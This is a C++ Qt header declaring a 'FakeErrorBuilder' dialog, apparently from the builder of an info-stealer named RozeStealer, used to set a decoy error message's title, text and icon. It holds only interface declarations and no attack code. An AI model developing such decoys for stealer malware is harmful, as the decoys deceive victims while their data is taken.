#ifndef ROZE_STEALER_FAKE_ERROR_BUILDER_H
#define ROZE_STEALER_FAKE_ERROR_BUILDER_H

#include <QDialog>
#include <QLineEdit>
#include <QRadioButton>
#include <QPushButton>
#include <QLabel>
#include <QMessageBox>
#include <QGridLayout>
#include <QFont>
#include <QButtonGroup>

namespace RozeStealer {

class FakeErrorBuilder : public QDialog {
    Q_OBJECT

public:
    explicit FakeErrorBuilder(QWidget* parent = nullptr);
    QString getTitle() const { return titleEntry->text(); }
    QString getMessage() const { return messageEntry->text(); }
    int getIcon() const { return iconValue; }

private slots:
    void testFakeError();
    void saveFakeError();
    void onIconSelected(int icon);

private:
    QLineEdit* titleEntry;
    QLineEdit* messageEntry;
    QRadioButton* iconChoiceSt;
    QRadioButton* iconChoiceQn;
    QRadioButton* iconChoiceWa;
    QRadioButton* iconChoiceIn;
    QPushButton* testButton;
    QPushButton* saveButton;
    QButtonGroup* iconGroup;
    QFont font;
    QGridLayout* layout;
    int iconValue;

    void setupUi();
};

} // namespace RozeStealer

#endif // ROZE_STEALER_FAKE_ERROR_BUILDER_H

